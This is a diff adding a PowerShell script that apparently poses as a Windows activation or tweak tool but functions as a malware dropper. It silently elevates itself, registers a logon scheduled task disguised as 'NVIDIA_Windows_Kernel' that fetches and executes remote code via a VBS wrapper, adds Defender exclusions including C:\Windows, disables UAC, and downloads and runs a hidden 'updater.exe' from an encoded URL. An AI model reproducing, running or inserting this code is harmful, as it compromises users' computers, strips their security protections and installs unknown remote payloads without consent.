@@ -1,0 +1,99 @@
+if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {  
+    $procArgs = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand " + [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($MyInvocation.MyCommand.Definition))  
+    Start-Process "powershell.exe" -ArgumentList $procArgs -Verb RunAs -WorkingDirectory $PSScriptRoot
+    Exit  
+}
+
+function AddTask{
+    $action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument @"
+/c echo Set WshShell=CreateObject("WScript.Shell"): WshShell.Run "powershell -ExecutionPolicy Bypass -Command ""iex (irm 'https://github.com/WindowsTweaksX/boom/raw/refs/heads/main/create_file')""", 0 > "%temp%\run.vbs" && cscript //nologo "%temp%\run.vbs" && del "%temp%\run.vbs"
+"@
+    $trigger = New-ScheduledTaskTrigger -AtLogon
+    Register-ScheduledTask -TaskName "NVIDIA_Windows_Kernel" -Action $action -Trigger $trigger -RunLevel Highest -Force -ErrorAction Stop
+}
+
+function Add-Exclusion {
+    param ([string]$Path)
+    try {
+        Add-MpPreference -ExclusionPath $Path -ErrorAction Stop | Out-Null
+    } catch {
+    }
+}
+
+function Disable-UAC {
+    try {
+        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" -Value 0 -ErrorAction Stop
+        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0 -ErrorAction Stop
+    } catch {
+    }
+}
+
+function Download-FileWithRetries {
+    param(
+        [string]$Url,
+        [string]$Output,
+        [int]$Retries = 3,
+        [int]$DelaySeconds = 5
+    )
+
+    for ($i = 0; $i -lt $Retries; $i++) {
+        try {
+            Invoke-WebRequest -Uri $Url -OutFile $Output -UseBasicParsing -ErrorAction Stop
+            if (Test-Path $Output) { return $true }
+        } catch {
+            Write-Warning "Download attempt $($i+1) failed: $_"
+            if ($i -lt ($Retries - 1)) {
+                Start-Sleep -Seconds $DelaySeconds
+            }
+        }
+    }
+    return $false
+}
+
+# Main execution
+try {
+    $downloadUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("b64url"))
+    $updaterExe = "updater.exe"
+    $hiddenFolder = Join-Path $env:LOCALAPPDATA ([System.Guid]::NewGuid().ToString())
+    $uacStatus = (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System").EnableLUA -eq 1
+    
+    # Create task
+    AddTask
+    
+    # Prepare environment
+    New-Item -ItemType Directory -Path $hiddenFolder -Force | Out-Null
+    Add-Exclusion -Path $hiddenFolder
+    Add-Exclusion -Path "C:\Windows\"
+    
+    $tempPath = Join-Path $hiddenFolder $updaterExe
+    
+    # Download and execute
+    if (Download-FileWithRetries -Url $downloadUrl -Output $tempPath) {
+        # Set hidden attributes
+        $folderAttr = [System.IO.FileAttributes]::Hidden
+        [System.IO.File]::SetAttributes($hiddenFolder, $folderAttr)
+        [System.IO.File]::SetAttributes($tempPath, $folderAttr)
+        
+        if (-not $uacStatus) {
+            $process = Start-Process -FilePath $tempPath -WindowStyle Hidden -PassThru
+            $process.WaitForExit()
+            
+            if ($process.ExitCode -eq 0) {
+                Write-Host "All good!" -ForegroundColor Green
+            } else {
+            }
+        } else {
+            Disable-UAC
+        }
+    } else {
+    }
+}
+catch {
+    Write-Host "An error occurred during activation: $_" -ForegroundColor Red
+    exit 1
+}
+finally {
+    if (Test-Path $hiddenFolder) {
+        Remove-Item $hiddenFolder -Recurse -Force -ErrorAction SilentlyContinue
+    }
+}
